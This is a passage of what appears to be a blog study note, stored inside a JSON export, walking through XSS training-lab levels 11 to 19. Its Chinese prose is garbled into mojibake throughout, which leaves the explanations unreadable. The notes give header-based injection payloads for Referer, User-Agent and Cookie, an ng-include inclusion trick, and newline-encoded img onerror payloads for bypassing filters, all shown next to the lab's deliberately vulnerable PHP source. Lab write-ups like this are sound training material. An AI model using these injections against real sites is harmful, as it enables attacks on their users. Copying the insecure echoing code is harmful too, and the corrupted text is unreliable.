‡ç­¾è™½ç„¶ä¹Ÿèƒ½æ¥æ”¶å¹¶æ˜¾ç¤ºå‚æ•°å€¼ï¼Œä½†æ˜¯è¿™ä¸ªå‚æ•°å€¼æ˜¯è¦ç”¨htmlspecialchars()å‡½æ•°å¤„ç†çš„ã€‚\nè¿™é‡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠ“åŒ…ï¼Œå°†æ•°æ®åŒ…ä¸­çš„refereræ”¹ä¸ºæˆ‘ä»¬çš„æ¶æ„ä»£ç \n\npayloadreferer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)\nlevel 12\næŸ¥çœ‹ç½‘é¡µæºç ï¼Œæˆ‘ä»¬å‘ç°ï¼Œæœ‰ä¸€ä¸ªå’Œuaå¤´ä¸€æ ·çš„å‚æ•°å€¼ï¼Œæˆ‘ä»¬å¯ä»¥å¤§èƒ†çŒœæµ‹ï¼Œè¿™å…³æµ‹è¯•ç‚¹å°±åœ¨uaå¤´ï¼ŒæŠ“åŒ…æ”¹åŒ…è¯•è¯•\n\næˆåŠŸ\npayloadUser-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)\næºä»£ç &lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str00 = $_GET[&quot;t_sort&quot;];\n$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nå°†keywordå‚æ•°çš„å€¼èµ‹ç»™äº†å˜é‡str\nå°†t_sotå‚æ•°çš„å€¼èµ‹ç»™äº†å˜é‡str00ï¼Œ\nå°†è¯·æ±‚ä¸­User-Agentå¤´çš„å€¼èµ‹ç»™äº†å˜é‡str11,ã€‚\nå°†å˜é‡str11çš„å€¼ä¸­å­˜åœ¨çš„&lt;å’Œ&gt;åˆ é™¤ä¹‹åç›´æ¥æ’å…¥åˆ°äº†t_uaæ ‡ç­¾çš„value\nå±æ€§å€¼ä¸­ã€‚\nåœ¨è¿™é‡Œå˜é‡strå’Œstr00çš„å€¼éƒ½æ˜¯éœ€è¦è¢«htmlspecialchars()å‡½æ•°å¤„ç†è¿‡\nlevel 1313å…³çŒœæµ‹è¿˜æ˜¯ä¸æ•°æ®å¤´æœ‰å…³\n\n\nå¯ä»¥çœ‹åˆ°ï¼Œæ˜¯å°†cookiesé‡Œçš„å€¼æ”¾å…¥äº†t_cookä¸­ï¼Œä¿®æ”¹ä¸ºæ¶æ„ä»£ç \npayloadCookie: user=1&quot; type=&quot;text&quot; onclick=&quot;alert(1)&quot;\næºä»£ç &lt;?php \nsetcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);\nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str00 = $_GET[&quot;t_sort&quot;];\n$str11=$_COOKIE[&quot;user&quot;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nlevel 14ä¿®æ”¹iframeè°ƒç”¨çš„æ–‡ä»¶æ¥å®ç°xssæ³¨å…¥(ä½†å› ä¸ºiframeè°ƒç”¨çš„æ–‡ä»¶åœ°å€å¤±æ•ˆï¼Œæ— æ³•è¿›è¡Œæµ‹è¯•\nlevel 15\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æäº¤çš„srcå‚æ•°è¢«æ’å…¥åˆ°äº†&lt;span&gt;æ ‡ç­¾çš„classå±æ€§å€¼ä¸­ï¼Œä½†æ˜¯å‰é¢è¿˜æœ‰ng-includeè¿™æ ·çš„å­—ç¬¦ã€‚\nng-includeæ˜¯angular jsä¸­çš„ä¸œè¥¿ï¼Œå…¶ä½œç”¨ç›¸å½“äºphpçš„includeå‡½æ•°ã€‚è¿™é‡Œå°±æ˜¯å°†1.gifè¿™ä¸ªæ–‡ä»¶ç»™åŒ…å«è¿›æ¥ã€‚\nng-includeç›¸å…³çŸ¥è¯†ç‚¹1ã€ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTMLæ–‡ä»¶ã€‚\n2ã€åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚\n3ã€ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚\n4ã€é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚\nç‰¹åˆ«å€¼å¾—æ³¨æ„çš„å‡ ç‚¹å¦‚ä¸‹ï¼š\n1.ng-include,å¦‚æœå•çº¯æŒ‡å®šåœ°å€ï¼Œå¿…é¡»è¦åŠ å¼•å·\n2.ng-include,åŠ è½½å¤–éƒ¨htmlï¼Œscriptæ ‡ç­¾ä¸­çš„å†…å®¹ä¸æ‰§è¡Œ\n3.ng-include,åŠ è½½å¤–éƒ¨htmlä¸­å«æœ‰styleæ ‡ç­¾æ ·å¼å¯ä»¥è¯†åˆ«\næ„é€ å‡½æ•°?src&#x3D;â€™level1.php?name&#x3D;â€˜å› ä¸ºè¿™é‡Œå‚æ•°å€¼ç®—æ˜¯ä¸€ä¸ªåœ°å€ï¼Œæ‰€ä»¥éœ€è¦æ·»åŠ å¼•å·ã€‚\nä½†æ˜¯level1.phpä¸æ˜¯ä¸€ä¸ªphpæ–‡ä»¶å—ï¼Ÿ\nè¿™é‡Œè§£é‡Šä¸€ä¸‹ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬ä¸æ˜¯å•çº¯çš„å»åŒ…å«level1.phpï¼Œè€Œæ˜¯åœ¨åé¢æ·»åŠ äº†nameå‚æ•°å€¼çš„ã€‚è¿™å°±æœ‰ç‚¹åƒæ˜¯åœ¨è®¿é—®äº†è¯¥å‚æ•°å€¼ä¸­åœ°å€ä¹‹åæŠŠå®ƒå“åº”åœ¨æµè§ˆå™¨ç«¯çš„htmlæ–‡ä»¶ç»™åŒ…å«è¿›æ¥çš„æ„æ€ã€‚\npayload?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;\næºä»£ç &lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;src&quot;];\necho &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;\n?&gt;\nlevel 16\nå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è¾“å…¥çš„å€¼è¢«æ’åˆ°äº†æ ‡ç­¾ä¸­ï¼Œæˆ‘ä»¬å°è¯•ç›´æ¥å¼¹çª—ï¼Œå‘ç°å¾ˆå¤šå­—ç¬¦è¢«ç¼–ç ï¼Œæ¥çœ‹çœ‹æºä»£ç \næºä»£ç &lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = strtolower($_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);\n$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);\n$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);\n$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);\necho &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;\n?&gt;\n&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;\n?&gt;\nå¯ä»¥çœ‹åˆ°ï¼Œå°†å‚æ•°å€¼ä¸­çš„scriptæ›¿æ¢æˆ&amp;nbsp;ï¼Œå°†å‚æ•°å€¼ä¸­çš„ç©ºæ ¼ä¹Ÿæ›¿æ¢æˆ&amp;nbsp;ï¼Œå°†å‚æ•°å€¼ä¸­çš„&#x2F;ç¬¦å·æ›¿æ¢æˆ&amp;nbsp;\nä¸æˆ‘ä»¬çš„çŒœæƒ³ä¸€è‡´\nç»•è¿‡æ€è·¯ï¼šå¯ä»¥ç”¨å›è½¦æ¥å°†å®ƒä»¬åˆ†å¼€ã€‚\nè€Œä¸”è¿™é‡Œ&#x2F;ç¬¦å·ä¹Ÿè¢«ç¼–ç äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦çš„æ˜¯ä¸€ä¸ªä¸éœ€è¦é—­åˆçš„æ ‡ç­¾ï¼Œæ¯”\nå¦‚ä¹‹å‰æ‰€ç”¨è¿‡çš„\n\n\nå›è½¦å¯ä»¥ç”¨urlç¼–ç %0aè¡¨ç¤º\npayload&lt;img%0Asrc=1%0Aonerror=alert(1)&gt;\nlevel 17\nå¯ä»¥çœ‹åˆ°æäº¤çš„å‚æ•°æ’å…¥åˆ°äº†æ ‡ç­¾çš„srcå±æ€§ä¸­ï¼Œå°è¯•ç›´æ¥å¼¹çª—ï¼Œå‘ç°è½¬ä¹‰äº†å¾ˆå¤šç¬¦å·ã€‚\nå°è¯•æ„é€ äº‹ä»¶å¼¹çª—ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„srcæ²¡æœ‰ç”¨å¼•å·é—­åˆï¼Œæˆ‘ä»¬å°±ä¸ç”¨ç®¡\npayloadonclick=alert(&#39;xss&#39;)\nonmousedown=&#39;alert(1)&#39;\n\n\næºä»£ç &lt;?phpÂ·\nini_set(&quot;display_errors&quot;, 0);\necho &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;\n?&gt;\nå¯ä»¥çœ‹åˆ°å’Œæˆ‘ä»¬çš„çŒœæµ‹ä¸€è‡´\nlevel 18ä¸17å…³ä¸€è‡´\nlevel 19ä¸ä¹‹å‰ä¸€è‡´ï¼Œä¸è¿‡ç”¨äº†å¼•å·å°†srcé—­åˆï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥åœ¨åé¢æ·»åŠ è¯­å¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡F12æ§åˆ¶å°æ·»åŠ \n","categories":["ç¬”è®°"],"tags":["ç¬”è®°"]}]